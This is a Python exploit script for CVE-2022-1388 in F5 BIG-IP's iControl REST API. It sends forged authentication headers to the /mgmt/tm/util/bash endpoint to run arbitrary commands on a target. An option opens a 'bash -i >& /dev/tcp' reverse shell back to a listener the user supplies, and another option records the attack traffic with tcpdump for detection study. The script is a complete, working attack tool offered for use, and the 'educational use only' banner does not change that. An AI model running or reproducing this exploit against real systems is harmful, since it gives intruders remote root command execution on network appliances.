#!/usr/bin/python3

####                                                                    ####
###                                                                      ###
##                                                                        ##
#   Author:      Jonathan (vaelwolf)                                       #
#   CVE/Info:    2022-1388, F5 BIG-IP iControl REST Vulnerability          #
#   Reference:   https://support.f5.com/csp/article/K23605346              #
#   Description: This vulnerability allows for an unauthorized, remote     #
#                attacker to execute arbitrary commands by accessing       #
#                the /mgmt/tm/util/bash endpoint via a POST request.       #
#                There are three options in the code below that will       #
#                create a single RCE, a reverse shell, and a tcpdump       #
#                to allow for your own attack traffic to be recorded       #
#                in a pcap for analysis and detection.                     #
##                                                                        ##
###                                                                      ###
####                                                                    ####

import argparse
import requests
import sslkeylog
import subprocess
import urllib3

from time import sleep


def init():

        ## Disable the 'InsecureRequestWarning' output
        urllib3.disable_warnings()

        ## Initialize Command Line Variables
        parser = argparse.ArgumentParser()
        parser.add_argument("-t", "--target", "--RHOSTS",  help="Target IP of vulnerable BIG-IP system",   required=True)
        parser.add_argument("-p", "--port", "--RPORT",     help="Target port on vulnerable BIG-IP system", required=True)
        parser.add_argument("-c", "--cmd", "--command",    help="Command to run on target system")
        parser.add_argument("-e", "--export", "--tcpdump", help="Export captured traffic on local machine to pcap. **Requires sudo privileges!", action="store_true")
        parser.add_argument("-q", "--quiet",               help="Don't display banner",                    action="store_true")
        parser.add_argument("-s", "--shell",               help="Launch an interactive shell",             action="store_true")
        parser.add_argument("-lh", "--lhost", "--LHOST",   help="Required for -s [shell]; Local IP/interface to bind listener to")
        parser.add_argument("-lp", "--lport", "--LPORT",   help="Required for -s [shell]; Local port to bind listener to", type=int)
        args = parser.parse_args()

        t = args.target
        p = args.port
        c = args.cmd
        e = args.export
        q = args.quiet
        s = args.shell

        lhost = args.lhost
        lport = args.lport

        ## Display the intro banner
        if not q:
                banner()

        ## Set target to the chosen Host:Port and vulnerable URI
        target = "https://{}:{}/mgmt/tm/util/bash".format(t, p)

        ## Set headers to the required content, connection, and authorization
        header = {
                'Content-Type': 'application/json',
                'Connection': 'X-F5-Auth-Token',
                'X-F5-Auth-Token': 'CVE-2022-1388 Exploit',
                'Authorization': 'Basic YWRtaW46dmFlbHdvbGY='
                }

        ## If you get a permission denied error, it is likely because you
        ## are not sudo and trying to run tcpdump! The below two options
        ## have aribtrary values that tcpdump will run. Feel free to extend
        ## or shorten as needed.
        if e and c:
                exportTcpdump(p, 5)
        elif e and s:
                exportTcpdump(lport, 600)

        ## If they want a shell, let's give 'em a shell!
        if s:
                if lhost and lport:

                        ## Give a chance to make sure their listener is ready...
                        print("[+] If you haven't already, please start your listener of choice on port {}".format(lport))
                        print("[+] Press any key to continue...")
                        input()

                        ## Use the standard bash /dev/tcp reverse shell, substituting in custom IP/port
                        data = {
                                'command': 'run', 
                                'utilCmdArgs': '-c "bash -i >& /dev/tcp/{}/{} 0>&1"'.format(lhost, lport)
                        }

                        return target, header, data
                else:
                        print("[!] Please specify --lhost and --lport!")
                        exit()

        ## If just a single command was specified (and not -s/--shell), send normal:
        else:

                ## Set JSON data to include the arbitrary single command 
                ## to be executed on the vulnerable target system
                data = {
                        'command': 'run', 
                        'utilCmdArgs': '-c "{}"'.format(c)
                        }

                ## Sleep for one second to allow tcpdump process 
                ## properly write to file if export flag is set:
                if e:
                        sleep(1)

                return target, header, data


def exportTcpdump(port, seconds):

                ## Initialize SSL Key log for decrypting later with Wireshark
                sslkeylog.set_keylog('ssl-key.log')

                ## Open tcpdump and dont record anything to screen. The -G and -W parameters
                ## are used to define the amount of seconds and files to write, respectively
                print("[+] Starting tcpdump on port {} for {} seconds\n".format(port, seconds))
                subprocess.Popen(['tcpdump', '-nnp', '-G {}'.format(seconds), '-W 1', 'port {}'.format(port), '-Uwdetection.pcap'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def CVE_2022_1388(target, header, data):

        ## Send the POST request with the configured headers and JSON
        ## data. When ending the reverse shell, often there will be a
        ## KeyError exception thrown. This try/except should fix that
        try:
                r = requests.post(url=target, headers=header, json=data, verify=False)
                if r.json()['commandResult']:
                        print(r.json()['commandResult'])

        except KeyError:
                print("[+] Exploit finished. If you launched a reverse shell listener, check there for your terminal!")


def banner():

        print("\n" + "=" * 111)
        print("[+] CVE-2022-1388 Exploit affecting F5 BIG-IP")
        print("[+] Author: vaelwolf")
        print("[+] Remediation:")
        print("\tUpgrade to a patched version found in the vendor advisory: https://support.f5.com/csp/article/K23605346")
        print("[!] For educational use only! Use at your own risk.")
        print("=" * 111, "\n\n")


if __name__ == "__main__":

        target, header, data = init()
        CVE_2022_1388(target, header, data)
